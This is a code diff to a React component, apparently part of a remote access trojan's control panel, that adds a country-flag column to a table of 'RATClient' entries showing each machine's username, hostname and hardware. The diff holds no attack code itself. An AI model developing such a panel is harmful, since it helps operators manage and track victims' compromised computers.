@@ -4,6 +4,7 @@ import {
   IconBrandUbuntu,
 } from "@tabler/icons-react";
 import { RATClient, FilterCategories } from "../../../types";
+import { useState, useEffect } from "react";
 
 import { CpuSvg, GpuSvg, RamSvg, StorageSvg } from "./Svgs";
 
@@ -49,6 +50,14 @@ export const ClientsTable = ({
     return gpuString;
   };
 
+  // Get country flag SVG path based on country code
+  const getCountryFlagPath = (countryCode: string) => {
+    if (!countryCode || countryCode === "N/A") return "";
+    
+    const code = countryCode.toLowerCase();
+    return `/country_flags/${code}.svg`;
+  };
+
   return (
     <table className="min-w-full border-separate border-spacing-0">
       <thead>
@@ -64,6 +73,12 @@ export const ClientsTable = ({
             className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
           >
             Group
+          </th>
+          <th
+            scope="col"
+            className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
+          >
+            Country
           </th>
           <th
             scope="col"
@@ -116,6 +131,20 @@ export const ClientsTable = ({
                   {client.group}
                 </td>
                 <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
+                  {client.country_code && client.country_code !== "N/A" ? (
+                    <div className="flex items-center gap-2">
+                      <img 
+                        src={getCountryFlagPath(client.country_code)}
+                        alt={client.country_code}
+                        className="w-6 h-4 object-cover"
+                      />
+                      <span>{client.country_code}</span>
+                    </div>
+                  ) : (
+                    "N/A"
+                  )}
+                </td>
+                <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                   <div className="flex items-center gap-3">
                     {getOsIcon({ client })}
                     {client.username}@{client.hostname}
@@ -154,7 +183,7 @@ export const ClientsTable = ({
           </>
         ) : (
           <tr>
-            <td colSpan={6} className="px-6 py-10 text-center text-white">
+            <td colSpan={7} className="px-6 py-10 text-center text-white">
               {searchTerm ||
               (Object.values(filters) as Record<string, boolean>[]).some(
                 (category) => Object.values(category).includes(false)
